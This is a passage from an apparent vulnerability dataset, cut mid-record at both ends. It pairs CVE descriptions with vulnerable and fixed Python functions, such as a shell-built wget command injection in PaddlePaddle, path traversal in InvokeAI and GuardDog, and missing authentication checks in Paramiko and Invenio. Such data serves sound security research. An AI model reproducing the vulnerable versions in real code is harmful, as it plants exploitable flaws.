'{highlight_start}', '{highlight_end}')'''\n+                    text = f'''highlight(\"{fts_table}\", 0, ?, ?)'''\n+                hl_data = (highlight_start, highlight_end)\n             text = ', ' + text\n         else:\n             text = ''\n@@ -28,7 +30,7 @@\n         if limit is not None:\n             query += f' LIMIT {limit}'\n         try:\n-            for record in conn.execute(query, restrict_to_fields+(fts_engine_query,)):\n+            for record in conn.execute(query, hl_data + restrict_to_fields + (fts_engine_query,)):\n                 result = {\n                     'id': record[0],\n                     'field': record[1],\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-43781",
    "cve_description": "Invenio-Drafts-Resources is a submission/deposit module for Invenio, a software framework for research data management. Invenio-Drafts-Resources prior to versions 0.13.7 and 0.14.6 does not properly check permissions when a record is published. The vulnerability is exploitable in a default installation of InvenioRDM. An authenticated a user is able via REST API calls to publish draft records of other users if they know the record identifier and the draft validates (e.g. all require fields filled out). An attacker is not able to modify the data in the record, and thus e.g. *cannot* change a record from restricted to public. The problem is patched in Invenio-Drafts-Resources v0.13.7 and 0.14.6, which is part of InvenioRDM v6.0.1 and InvenioRDM v7.0 respectively.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-639": {
        "name": "Authorization Bypass Through User-Controlled Key",
        "description": "The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data."
      },
      "CWE-863": {
        "name": "Incorrect Authorization",
        "description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check."
      }
    },
    "repo": "https://github.com/inveniosoftware/invenio-drafts-resources",
    "patch_url": [
      "https://github.com/inveniosoftware/invenio-drafts-resources/commit/039b0cff1ad4b952000f4d8c3a93f347108b6626"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_207_1",
        "commit": "998ede9",
        "file_path": "invenio_drafts_resources/services/records/service.py",
        "start_line": 260,
        "end_line": 296,
        "snippet": "    def publish(self, id_, identity, uow=None):\n        \"\"\"Publish a draft.\n\n        Idea:\n            - Get the draft from the data layer (draft is not passed in)\n            - Validate it more strictly than when it was originally saved\n              (drafts can be incomplete but only complete drafts can be turned\n              into records)\n            - Create or update associated (published) record with data\n        \"\"\"\n        self.require_permission(identity, \"publish\")\n\n        # Get the draft\n        draft = self.draft_cls.pid.resolve(id_, registered_only=False)\n\n        # Validate the draft strictly - since a draft can be saved with errors\n        # we do a strict validation here to make sure only valid drafts can be\n        # published.\n        self._validate_draft(identity, draft)\n\n        # Create the record from the draft\n        latest_id = draft.versions.latest_id\n        record = self.record_cls.publish(draft)\n\n        # Run components\n        self.run_components(\n            'publish', identity, draft=draft, record=record, uow=uow)\n\n        # Commit and index\n        uow.register(RecordCommitOp(record, indexer=self.indexer))\n        uow.register(RecordDeleteOp(draft, force=False, indexer=self.indexer))\n\n        if latest_id:\n            self._reindex_latest(latest_id, uow=uow)\n\n        return self.result_item(\n            self, identity, record, links_tpl=self.links_item_tpl)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_207_1",
        "commit": "039b0cf",
        "file_path": "invenio_drafts_resources/services/records/service.py",
        "start_line": 260,
        "end_line": 295,
        "snippet": "    def publish(self, id_, identity, uow=None):\n        \"\"\"Publish a draft.\n\n        Idea:\n            - Get the draft from the data layer (draft is not passed in)\n            - Validate it more strictly than when it was originally saved\n              (drafts can be incomplete but only complete drafts can be turned\n              into records)\n            - Create or update associated (published) record with data\n        \"\"\"\n        # Get the draft\n        draft = self.draft_cls.pid.resolve(id_, registered_only=False)\n        self.require_permission(identity, \"publish\", record=draft)\n\n        # Validate the draft strictly - since a draft can be saved with errors\n        # we do a strict validation here to make sure only valid drafts can be\n        # published.\n        self._validate_draft(identity, draft)\n\n        # Create the record from the draft\n        latest_id = draft.versions.latest_id\n        record = self.record_cls.publish(draft)\n\n        # Run components\n        self.run_components(\n            'publish', identity, draft=draft, record=record, uow=uow)\n\n        # Commit and index\n        uow.register(RecordCommitOp(record, indexer=self.indexer))\n        uow.register(RecordDeleteOp(draft, force=False, indexer=self.indexer))\n\n        if latest_id:\n            self._reindex_latest(latest_id, uow=uow)\n\n        return self.result_item(\n            self, identity, record, links_tpl=self.links_item_tpl)"
      }
    ],
    "vul_patch": "--- a/invenio_drafts_resources/services/records/service.py\n+++ b/invenio_drafts_resources/services/records/service.py\n@@ -8,10 +8,9 @@\n               into records)\n             - Create or update associated (published) record with data\n         \"\"\"\n-        self.require_permission(identity, \"publish\")\n-\n         # Get the draft\n         draft = self.draft_cls.pid.resolve(id_, registered_only=False)\n+        self.require_permission(identity, \"publish\", record=draft)\n \n         # Validate the draft strictly - since a draft can be saved with errors\n         # we do a strict validation here to make sure only valid drafts can be\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-52311",
    "cve_description": "PaddlePaddle before 2.6.0 has a command injection in _wget_download. This resulted in the ability to execute arbitrary commands on the operating system.\n\n\n\n\n\n\n\n",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/PaddlePaddle/Paddle",
    "patch_url": [
      "https://github.com/PaddlePaddle/Paddle/commit/c5f6862d118d7d69210f0e73bea1b055f5f21f2b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_218_1",
        "commit": "e64a054",
        "file_path": "python/paddle/utils/download.py",
        "start_line": 199,
        "end_line": 216,
        "snippet": "def _wget_download(url, fullname):\n    # using wget to download url\n    tmp_fullname = fullname + \"_tmp\"\n    # \\u2013user-agent\n    command = f'wget -O {tmp_fullname} -t {DOWNLOAD_RETRY_LIMIT} {url}'\n    subprc = subprocess.Popen(\n        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE\n    )\n    _ = subprc.communicate()\n\n    if subprc.returncode != 0:\n        raise RuntimeError(\n            f'{command} failed. Please make sure `wget` is installed or {url} exists'\n        )\n\n    shutil.move(tmp_fullname, fullname)\n\n    return fullname"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_218_1",
        "commit": "c5f6862",
        "file_path": "python/paddle/utils/download.py",
        "start_line": 200,
        "end_line": 226,
        "snippet": "def _wget_download(url: str, fullname: str):\n    try:\n        assert urlparse(url).scheme in (\n            'http',\n            'https',\n        ), 'Only support https and http url'\n        # using wget to download url\n        tmp_fullname = fullname + \"_tmp\"\n        # \\u2013user-agent\n        command = f'wget -O {tmp_fullname} -t {DOWNLOAD_RETRY_LIMIT} {url}'\n        subprc = subprocess.Popen(\n            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE\n        )\n        _ = subprc.communicate()\n\n        if subprc.returncode != 0:\n            raise RuntimeError(\n                f'{command} failed. Please make sure `wget` is installed or {url} exists'\n            )\n\n        shutil.move(tmp_fullname, fullname)\n\n    except Exception as e:  # requests.exceptions.ConnectionError\n        logger.info(f\"Downloading {url} failed with exception {str(e)}\")\n        return False\n\n    return fullname"
      }
    ],
    "vul_patch": "--- a/python/paddle/utils/download.py\n+++ b/python/paddle/utils/download.py\n@@ -1,18 +1,27 @@\n-def _wget_download(url, fullname):\n-    # using wget to download url\n-    tmp_fullname = fullname + \"_tmp\"\n-    # \\u2013user-agent\n-    command = f'wget -O {tmp_fullname} -t {DOWNLOAD_RETRY_LIMIT} {url}'\n-    subprc = subprocess.Popen(\n-        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE\n-    )\n-    _ = subprc.communicate()\n+def _wget_download(url: str, fullname: str):\n+    try:\n+        assert urlparse(url).scheme in (\n+            'http',\n+            'https',\n+        ), 'Only support https and http url'\n+        # using wget to download url\n+        tmp_fullname = fullname + \"_tmp\"\n+        # \\u2013user-agent\n+        command = f'wget -O {tmp_fullname} -t {DOWNLOAD_RETRY_LIMIT} {url}'\n+        subprc = subprocess.Popen(\n+            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE\n+        )\n+        _ = subprc.communicate()\n \n-    if subprc.returncode != 0:\n-        raise RuntimeError(\n-            f'{command} failed. Please make sure `wget` is installed or {url} exists'\n-        )\n+        if subprc.returncode != 0:\n+            raise RuntimeError(\n+                f'{command} failed. Please make sure `wget` is installed or {url} exists'\n+            )\n \n-    shutil.move(tmp_fullname, fullname)\n+        shutil.move(tmp_fullname, fullname)\n+\n+    except Exception as e:  # requests.exceptions.ConnectionError\n+        logger.info(f\"Downloading {url} failed with exception {str(e)}\")\n+        return False\n \n     return fullname\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-11042",
    "cve_description": "In invoke-ai/invokeai version v5.0.2, the web API `POST /api/v1/images/delete` is vulnerable to Arbitrary File Deletion. This vulnerability allows unauthorized attackers to delete arbitrary files on the server, potentially including critical or sensitive system files such as SSH keys, SQLite databases, and configuration files. This can impact the integrity and availability of applications relying on these files.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/invoke-ai/invokeai",
    "patch_url": [
      "https://github.com/invoke-ai/invokeai/commit/5440c037674882b2ab7acd59087e9bb04b49657a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_247_1",
        "commit": "358dbdb",
        "file_path": "invokeai/app/services/image_files/image_files_disk.py",
        "start_line": 114,
        "end_line": 121,
        "snippet": "    def get_path(self, image_name: str, thumbnail: bool = False) -> Path:\n        path = self.__output_folder / image_name\n\n        if thumbnail:\n            thumbnail_name = get_thumbnail_name(image_name)\n            path = self.__thumbnails_folder / thumbnail_name\n\n        return path"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_247_1",
        "commit": "5440c03",
        "file_path": "invokeai/app/services/image_files/image_files_disk.py",
        "start_line": 113,
        "end_line": 132,
        "snippet": "    def get_path(self, image_name: str, thumbnail: bool = False) -> Path:\n        base_folder = self.__thumbnails_folder if thumbnail else self.__output_folder\n        filename = get_thumbnail_name(image_name) if thumbnail else image_name\n\n        # Strip any path information from the filename\n        basename = Path(filename).name\n\n        if basename != filename:\n            raise ValueError(\"Invalid image name, potential directory traversal detected\")\n\n        image_path = base_folder / basename\n\n        # Ensure the image path is within the base folder to prevent directory traversal\n        resolved_base = base_folder.resolve()\n        resolved_image_path = image_path.resolve()\n\n        if not resolved_image_path.is_relative_to(resolved_base):\n            raise ValueError(\"Image path outside outputs folder, potential directory traversal detected\")\n\n        return resolved_image_path"
      }
    ],
    "vul_patch": "--- a/invokeai/app/services/image_files/image_files_disk.py\n+++ b/invokeai/app/services/image_files/image_files_disk.py\n@@ -1,8 +1,20 @@\n     def get_path(self, image_name: str, thumbnail: bool = False) -> Path:\n-        path = self.__output_folder / image_name\n+        base_folder = self.__thumbnails_folder if thumbnail else self.__output_folder\n+        filename = get_thumbnail_name(image_name) if thumbnail else image_name\n \n-        if thumbnail:\n-            thumbnail_name = get_thumbnail_name(image_name)\n-            path = self.__thumbnails_folder / thumbnail_name\n+        # Strip any path information from the filename\n+        basename = Path(filename).name\n \n-        return path\n+        if basename != filename:\n+            raise ValueError(\"Invalid image name, potential directory traversal detected\")\n+\n+        image_path = base_folder / basename\n+\n+        # Ensure the image path is within the base folder to prevent directory traversal\n+        resolved_base = base_folder.resolve()\n+        resolved_image_path = image_path.resolve()\n+\n+        if not resolved_image_path.is_relative_to(resolved_base):\n+            raise ValueError(\"Image path outside outputs folder, potential directory traversal detected\")\n+\n+        return resolved_image_path\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-41247",
    "cve_description": "JupyterHub is an open source multi-user server for Jupyter notebooks. In affected versions users who have multiple JupyterLab tabs open in the same browser session, may see incomplete logout from the single-user server, as fresh credentials (for the single-user server only, not the Hub) reinstated after logout, if another active JupyterLab session is open while the logout takes place. Upgrade to JupyterHub 1.5. For distributed deployments, it is jupyterhub in the _user_ environment that needs patching. There are no patches necessary in the Hub environment. The only workaround is to make sure that only one JupyterLab tab is open when you log out.",
    "cwe_info": {
      "CWE-613": {
        "name": "Insufficient Session Expiration",
        "description": "According to WASC, \"Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.\""
      }
    },
    "repo": "https://github.com/jupyterhub/jupyterhub",
    "patch_url": [
      "https://github.com/jupyterhub/jupyterhub/commit/5ac9e7f73a6e1020ffddc40321fc53336829fe27"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_396_1",
        "commit": "0611169dea3af911f52abc155f4051209f1b28e8",
        "file_path": "jupyterhub/services/auth.py",
        "start_line": 898,
        "end_line": 942,
        "snippet": "    def get_current_user(self):\n        \"\"\"Tornado's authentication method\n\n        Returns:\n            user_model (dict): The user model, if a user is identified, None if authentication fails.\n        \"\"\"\n        if hasattr(self, '_hub_auth_user_cache'):\n            return self._hub_auth_user_cache\n        user_model = self.hub_auth.get_user(self)\n        if not user_model:\n            self._hub_auth_user_cache = None\n            return\n        try:\n            self._hub_auth_user_cache = self.check_hub_user(user_model)\n        except UserNotAllowed as e:\n            # cache None, in case get_user is called again while processing the error\n            self._hub_auth_user_cache = None\n            # Override redirect so if/when tornado @web.authenticated\n            # tries to redirect to login URL, 403 will be raised instead.\n            # This is not the best, but avoids problems that can be caused\n            # when get_current_user is allowed to raise.\n            def raise_on_redirect(*args, **kwargs):\n                raise HTTPError(\n                    403, \"{kind} {name} is not allowed.\".format(**user_model)\n                )\n\n            self.redirect = raise_on_redirect\n            return\n        except Exception:\n            self._hub_auth_user_cache = None\n            raise\n\n        # store tokens passed via url or header in a cookie for future requests\n        url_token = self.hub_auth.get_token(self)\n        if (\n            user_model\n            and url_token\n            and getattr(self, '_token_authenticated', False)\n            and hasattr(self.hub_auth, 'set_cookie')\n        ):\n            # authenticated via `?token=`\n            # set a cookie for future requests\n            # hub_auth.set_cookie is only available on HubOAuth\n            self.hub_auth.set_cookie(self, url_token)\n        return self._hub_auth_user_cache"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_396_1",
        "commit": "5ac9e7f73a6e1020ffddc40321fc53336829fe27",
        "file_path": "jupyterhub/services/auth.py",
        "start_line": 898,
        "end_line": 942,
        "snippet": "    def get_current_user(self):\n        \"\"\"Tornado's authentication method\n\n        Returns:\n            user_model (dict): The user model, if a user is identified, None if authentication fails.\n        \"\"\"\n        if hasattr(self, '_hub_auth_user_cache'):\n            return self._hub_auth_user_cache\n        user_model = self.hub_auth.get_user(self)\n        if not user_model:\n            self._hub_auth_user_cache = None\n            return\n        try:\n            self._hub_auth_user_cache = self.check_hub_user(user_model)\n        except UserNotAllowed as e:\n            # cache None, in case get_user is called again while processing the error\n            self._hub_auth_user_cache = None\n            # Override redirect so if/when tornado @web.authenticated\n            # tries to redirect to login URL, 403 will be raised instead.\n            # This is not the best, but avoids problems that can be caused\n            # when get_current_user is allowed to raise.\n            def raise_on_redirect(*args, **kwargs):\n                raise HTTPError(\n                    403, \"{kind} {name} is not allowed.\".format(**user_model)\n                )\n\n            self.redirect = raise_on_redirect\n            return\n        except Exception:\n            self._hub_auth_user_cache = None\n            raise\n\n        # store ?token=... tokens passed via url in a cookie for future requests\n        url_token = self.get_argument('token', '')\n        if (\n            user_model\n            and url_token\n            and getattr(self, '_token_authenticated', False)\n            and hasattr(self.hub_auth, 'set_cookie')\n        ):\n            # authenticated via `?token=`\n            # set a cookie for future requests\n            # hub_auth.set_cookie is only available on HubOAuth\n            self.hub_auth.set_cookie(self, url_token)\n        return self._hub_auth_user_cache"
      }
    ],
    "vul_patch": "--- a/jupyterhub/services/auth.py\n+++ b/jupyterhub/services/auth.py\n@@ -30,8 +30,8 @@\n             self._hub_auth_user_cache = None\n             raise\n \n-        # store tokens passed via url or header in a cookie for future requests\n-        url_token = self.hub_auth.get_token(self)\n+        # store ?token=... tokens passed via url in a cookie for future requests\n+        url_token = self.get_argument('token', '')\n         if (\n             user_model\n             and url_token\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-23531",
    "cve_description": "GuardDog is a CLI tool to identify malicious PyPI packages. Versions prior to 0.1.5 are vulnerable to Relative Path Traversal when scanning a specially-crafted local PyPI package. Running GuardDog against a specially-crafted package can allow an attacker to write an arbitrary file on the machine where GuardDog is executed due to a path traversal vulnerability when extracting the .tar.gz file of the package being scanned, which exists by design in the tarfile.TarFile.extractall function. This issue is patched in version 0.1.5.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/DataDog/guarddog",
    "patch_url": [
      "https://github.com/DataDog/guarddog/commit/98af5c8c1e9c15fa888c900252e76116b0ec25d1"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_343_1",
        "commit": "14b3858005c52ccae64953b2920beefd0514a2e4",
        "file_path": "guarddog/scanners/package_scanner.py",
        "start_line": 26,
        "end_line": 52,
        "snippet": "    def scan_local(self, path, rules=None) -> dict:\n        \"\"\"\n        Scans local package\n\n        Args:\n            path (str): path to package\n            rules (set, optional): Set of rule names to use. Defaults to all rules.\n\n        Raises:\n            Exception: Analyzer exception\n\n        Returns:\n            dict: Analyzer output with rules to results mapping\n        \"\"\"\n\n        if rules is not None:\n            rules = set(rules)\n\n        if os.path.exists(path):\n            if path.endswith('.tar.gz'):\n                with tempfile.TemporaryDirectory() as tmpdirname:\n                    tarfile.open(path).extractall(tmpdirname)\n                    return self.analyzer.analyze_sourcecode(tmpdirname, rules=rules)\n            elif os.path.isdir(path):\n                return self.analyzer.analyze_sourcecode(path, rules=rules)\n        else:\n            raise Exception(f\"Path {path} does not exist.\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_343_1",
        "commit": "98af5c8c1e9c15fa888c900252e76116b0ec25d1",
        "file_path": "guarddog/scanners/package_scanner.py",
        "start_line": 26,
        "end_line": 52,
        "snippet": "    def scan_local(self, path, rules=None) -> dict:\n        \"\"\"\n        Scans local package\n\n        Args:\n            path (str): path to package\n            rules (set, optional): Set of rule names to use. Defaults to all rules.\n\n        Raises:\n            Exception: Analyzer exception\n\n        Returns:\n            dict: Analyzer output with rules to results mapping\n        \"\"\"\n\n        if rules is not None:\n            rules = set(rules)\n\n        if os.path.exists(path):\n            if path.endswith('.tar.gz'):\n                with tempfile.TemporaryDirectory() as tmpdirname:\n                    tarsafe.open(path).extractall(tmpdirname)\n                    return self.analyzer.analyze_sourcecode(tmpdirname, rules=rules)\n            elif os.path.isdir(path):\n                return self.analyzer.analyze_sourcecode(path, rules=rules)\n        else:\n            raise Exception(f\"Path {path} does not exist.\")"
      }
    ],
    "vul_patch": "--- a/guarddog/scanners/package_scanner.py\n+++ b/guarddog/scanners/package_scanner.py\n@@ -19,7 +19,7 @@\n         if os.path.exists(path):\n             if path.endswith('.tar.gz'):\n                 with tempfile.TemporaryDirectory() as tmpdirname:\n-                    tarfile.open(path).extractall(tmpdirname)\n+                    tarsafe.open(path).extractall(tmpdirname)\n                     return self.analyzer.analyze_sourcecode(tmpdirname, rules=rules)\n             elif os.path.isdir(path):\n                 return self.analyzer.analyze_sourcecode(path, rules=rules)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2018-7750",
    "cve_description": "transport.py in the SSH server implementation of Paramiko before 1.17.6, 1.18.x before 1.18.5, 2.0.x before 2.0.8, 2.1.x before 2.1.5, 2.2.x before 2.2.3, 2.3.x before 2.3.2, and 2.4.x before 2.4.1 does not properly check whether authentication is completed before processing other requests, as demonstrated by channel-open. A customized SSH client can simply skip the authentication step.",
    "cwe_info": {
      "CWE-287": {
        "name": "Improper Authentication",
        "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct."
      }
    },
    "repo": "https://github.com/paramiko/paramiko",
    "patch_url": [
      "https://github.com/paramiko/paramiko/commit/fa29bd8446c8eab237f5187d28787727b4610516"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_169_1",
        "commit": "aefd28a",
        "file_path": "paramiko/transport.py",
        "start_line": 1764,
        "end_line": 1895,
        "snippet": "    def run(self):\n        # (use the exposed \"run\" method, because if we specify a thread target\n        # of a private method, threading.Thread will keep a reference to it\n        # indefinitely, creating a GC cycle and not letting Transport ever be\n        # GC'd. it's a bug in Thread.)\n\n        # Hold reference to 'sys' so we can test sys.modules to detect\n        # interpreter shutdown.\n        self.sys = sys\n\n        # active=True occurs before the thread is launched, to avoid a race\n        _active_threads.append(self)\n        tid = hex(long(id(self)) & xffffffff)\n        if self.server_mode:\n            self._log(DEBUG, 'starting thread (server mode): %s' % tid)\n        else:\n            self._log(DEBUG, 'starting thread (client mode): %s' % tid)\n        try:\n            try:\n                self.packetizer.write_all(b(self.local_version + '\\r\\n'))\n                self._log(DEBUG, 'Local version/idstring: %s' % self.local_version) # noqa\n                self._check_banner()\n                # The above is actually very much part of the handshake, but\n                # sometimes the banner can be read but the machine is not\n                # responding, for example when the remote ssh daemon is loaded\n                # in to memory but we can not read from the disk/spawn a new\n                # shell.\n                # Make sure we can specify a timeout for the initial handshake.\n                # Re-use the banner timeout for now.\n                self.packetizer.start_handshake(self.handshake_timeout)\n                self._send_kex_init()\n                self._expect_packet(MSG_KEXINIT)\n\n                while self.active:\n                    if self.packetizer.need_rekey() and not self.in_kex:\n                        self._send_kex_init()\n                    try:\n                        ptype, m = self.packetizer.read_message()\n                    except NeedRekeyException:\n                        continue\n                    if ptype == MSG_IGNORE:\n                        continue\n                    elif ptype == MSG_DISCONNECT:\n                        self._parse_disconnect(m)\n                        self.active = False\n                        self.packetizer.close()\n                        break\n                    elif ptype == MSG_DEBUG:\n                        self._parse_debug(m)\n                        continue\n                    if len(self._expected_packet) > 0:\n                        if ptype not in self._expected_packet:\n                            raise SSHException('Expecting packet from %r, got %d' % (self._expected_packet, ptype)) # noqa\n                        self._expected_packet = tuple()\n                        if (ptype >= 30) and (ptype <= 41):\n                            self.kex_engine.parse_next(ptype, m)\n                            continue\n\n                    if ptype in self._handler_table:\n                        self._handler_table[ptype](self, m)\n                    elif ptype in self._channel_handler_table:\n                        chanid = m.get_int()\n                        chan = self._channels.get(chanid)\n                        if chan is not None:\n                            self._channel_handler_table[ptype](chan, m)\n                        elif chanid in self.channels_seen:\n                            self._log(DEBUG, 'Ignoring message for dead channel %d' % chanid) # noqa\n                        else:\n                            self._log(ERROR, 'Channel request for unknown channel %d' % chanid) # noqa\n                            self.active = False\n                            self.packetizer.close()\n                    elif (\n                        self.auth_handler is not None and\n                        ptype in self.auth_handler._handler_table\n                    ):\n                        handler = self.auth_handler._handler_table[ptype]\n                        handler(self.auth_handler, m)\n                        if len(self._expected_packet) > 0:\n                            continue\n                    else:\n                        self._log(WARNING, 'Oops, unhandled type %d' % ptype)\n                        msg = Message()\n                        msg.add_byte(cMSG_UNIMPLEMENTED)\n                        msg.add_int(m.seqno)\n                        self._send_message(msg)\n                    self.packetizer.complete_handshake()\n            except SSHException as e:\n                self._log(ERROR, 'Exception: ' + str(e))\n                self._log(ERROR, util.tb_strings())\n                self.saved_exception = e\n            except EOFError as e:\n                self._log(DEBUG, 'EOF in transport thread')\n                self.saved_exception = e\n            except socket.error as e:\n                if type(e.args) is tuple:\n                    if e.args:\n                        emsg = '%s (%d)' % (e.args[1], e.args[0])\n                    else:  # empty tuple, e.g. socket.timeout\n                        emsg = str(e) or repr(e)\n                else:\n                    emsg = e.args\n                self._log(ERROR, 'Socket exception: ' + emsg)\n                self.saved_exception = e\n            except Exception as e:\n                self._log(ERROR, 'Unknown exception: ' + str(e))\n                self._log(ERROR, util.tb_strings())\n                self.saved_exception = e\n            _active_threads.remove(self)\n            for chan in list(self._channels.values()):\n                chan._unlink()\n            if self.active:\n                self.active = False\n                self.packetizer.close()\n                if self.completion_event is not None:\n                    self.completion_event.set()\n                if self.auth_handler is not None:\n                    self.auth_handler.abort()\n                for event in self.channel_events.values():\n                    event.set()\n                try:\n                    self.lock.acquire()\n                    self.server_accept_cv.notify()\n                finally:\n                    self.lock.release()\n            self.sock.close()\n        except:\n            # Don't raise spurious 'NoneType has no attribute X' errors when we\n            # wake up during interpreter shutdown. Or rather -- raise\n            # everything *if* sys.modules (used as a convenient sentinel)\n            # appears to still exist.\n            if self.sys.modules is not None:\n                raise"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_169_2",
        "commit": "fa29bd8",
        "file_path": "paramiko/transport.py",
        "start_line": 1763,
        "end_line": 1799,
        "snippet": "    def _ensure_authed(self, ptype, message):\n        \"\"\"\n        Checks message type against current auth state.\n\n        If server mode, and auth has not succeeded, and the message is of a\n        post-auth type (channel open or global request) an appropriate error\n        response Message is crafted and returned to caller for sending.\n\n        Otherwise (client mode, authed, or pre-auth message) returns None.\n        \"\"\"\n        if (\n            not self.server_mode\n            or ptype <= HIGHEST_USERAUTH_MESSAGE_ID\n            or self.is_authenticated()\n        ):\n            return None\n        # WELP. We must be dealing with someone trying to do non-auth things\n        # without being authed. Tell them off, based on message class.\n        reply = Message()\n        # Global requests have no details, just failure.\n        if ptype == MSG_GLOBAL_REQUEST:\n            reply.add_byte(cMSG_REQUEST_FAILURE)\n        # Channel opens let us reject w/ a specific type + message.\n        elif ptype == MSG_CHANNEL_OPEN:\n            kind = message.get_text()\n            chanid = message.get_int()\n            reply.add_byte(cMSG_CHANNEL_OPEN_FAILURE)\n            reply.add_int(chanid)\n            reply.add_int(OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED)\n            reply.add_string('')\n            reply.add_string('en')\n        # NOTE: Post-open channel messages do not need checking; the above will\n        # reject attemps to open channels, meaning that even if a malicious\n        # user tries to send a MSG_CHANNEL_REQUEST, it will simply fall under\n        # the logic that handles unknown channel IDs (as the channel list will\n        # be empty.)\n        return reply"
      },
      {
        "id": "fix_py_169_1",
        "commit": "fa29bd8",
        "file_path": "paramiko/transport.py",
        "start_line": 1801,
        "end_line": 1936,
        "snippet": "    def run(self):\n        # (use the exposed \"run\" method, because if we specify a thread target\n        # of a private method, threading.Thread will keep a reference to it\n        # indefinitely, creating a GC cycle and not letting Transport ever be\n        # GC'd. it's a bug in Thread.)\n\n        # Hold reference to 'sys' so we can test sys.modules to detect\n        # interpreter shutdown.\n        self.sys = sys\n\n        # active=True occurs before the thread is launched, to avoid a race\n        _active_threads.append(self)\n        tid = hex(long(id(self)) & xffffffff)\n        if self.server_mode:\n            self._log(DEBUG, 'starting thread (server mode): %s' % tid)\n        else:\n            self._log(DEBUG, 'starting thread (client mode): %s' % tid)\n        try:\n            try:\n                self.packetizer.write_all(b(self.local_version + '\\r\\n'))\n                self._log(DEBUG, 'Local version/idstring: %s' % self.local_version) # noqa\n                self._check_banner()\n                # The above is actually very much part of the handshake, but\n                # sometimes the banner can be read but the machine is not\n                # responding, for example when the remote ssh daemon is loaded\n                # in to memory but we can not read from the disk/spawn a new\n                # shell.\n                # Make sure we can specify a timeout for the initial handshake.\n                # Re-use the banner timeout for now.\n                self.packetizer.start_handshake(self.handshake_timeout)\n                self._send_kex_init()\n                self._expect_packet(MSG_KEXINIT)\n\n                while self.active:\n                    if self.packetizer.need_rekey() and not self.in_kex:\n                        self._send_kex_init()\n                    try:\n                        ptype, m = self.packetizer.read_message()\n                    except NeedRekeyException:\n                        continue\n                    if ptype == MSG_IGNORE:\n                        continue\n                    elif ptype == MSG_DISCONNECT:\n                        self._parse_disconnect(m)\n                        self.active = False\n                        self.packetizer.close()\n                        break\n                    elif ptype == MSG_DEBUG:\n                        self._parse_debug(m)\n                        continue\n                    if len(self._expected_packet) > 0:\n                        if ptype not in self._expected_packet:\n                            raise SSHException('Expecting packet from %r, got %d' % (self._expected_packet, ptype)) # noqa\n                        self._expected_packet = tuple()\n                        if (ptype >= 30) and (ptype <= 41):\n                            self.kex_engine.parse_next(ptype, m)\n                            continue\n\n                    if ptype in self._handler_table:\n                        error_msg = self._ensure_authed(ptype, m)\n                        if error_msg:\n                            self._send_message(error_msg)\n                        else:\n                            self._handler_table[ptype](self, m)\n                    elif ptype in self._channel_handler_table:\n                        chanid = m.get_int()\n                        chan = self._channels.get(chanid)\n                        if chan is not None:\n                            self._channel_handler_table[ptype](chan, m)\n                        elif chanid in self.channels_seen:\n                            self._log(DEBUG, 'Ignoring message for dead channel %d' % chanid) # noqa\n                        else:\n                            self._log(ERROR, 'Channel request for unknown channel %d' % chanid) # noqa\n                            self.active = False\n                            self.packetizer.close()\n                    elif (\n                        self.auth_handler is not None and\n                        ptype in self.auth_handler._handler_table\n                    ):\n                        handler = self.auth_handler._handler_table[ptype]\n                        